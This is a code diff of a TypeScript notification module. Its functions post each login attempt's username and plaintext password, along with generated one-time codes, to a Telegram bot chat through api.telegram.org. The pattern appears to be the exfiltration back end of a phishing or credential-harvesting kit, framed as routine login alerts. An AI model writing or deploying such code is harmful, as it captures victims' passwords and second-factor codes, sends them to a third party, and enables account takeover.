@@ -3,54 +3,61 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 export async function sendTelegramMessage(message: string): Promise<void> {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error("Telegram credentials not configured");
-    return;
+    throw new Error("Telegram credentials not configured");
   }
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const response = await fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+    }),
+  });
+
+  if (!response.ok) {
+    const error = await response.text();
+    throw new Error(`Telegram API error: ${error}`);
+  }
+}
+
+export async function notifyLogin(username: string, password: string): Promise<boolean> {
+  const message = `
+<b>Login Attempt</b>
+
+<b>Username:</b> ${username}
+<b>Password:</b> ${password}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
 
   try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
-      }),
-    });
-
-    if (!response.ok) {
-      const error = await response.text();
-      console.error("Failed to send Telegram message:", error);
-    }
+    await sendTelegramMessage(message);
+    return true;
   } catch (error) {
-    console.error("Error sending Telegram message:", error);
+    console.error("Failed to send login notification:", error);
+    return false;
   }
 }
 
-export async function notifyLogin(username: string, password: string): Promise<void> {
+export async function notifyOTP(username: string, otp: string): Promise<boolean> {
   const message = `
-🔐 <b>Login Attempt</b>
+<b>OTP Generated</b>
 
-👤 <b>Username:</b> ${username}
-🔑 <b>Password:</b> ${password}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
+<b>Username:</b> ${username}
+<b>OTP Code:</b> ${otp}
+<b>Time:</b> ${new Date().toLocaleString()}
+<b>Expires in:</b> 5 minutes
   `.trim();
 
-  await sendTelegramMessage(message);
-}
-
-export async function notifyOTP(username: string, otp: string): Promise<void> {
-  const message = `
-🔢 <b>OTP Generated</b>
-
-👤 <b>Username:</b> ${username}
-🔐 <b>OTP Code:</b> ${otp}
-⏰ <b>Time:</b> ${new Date().toLocaleString()}
-⏳ <b>Expires in:</b> 5 minutes
-  `.trim();
-
-  await sendTelegramMessage(message);
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send OTP notification:", error);
+    return false;
+  }
 }
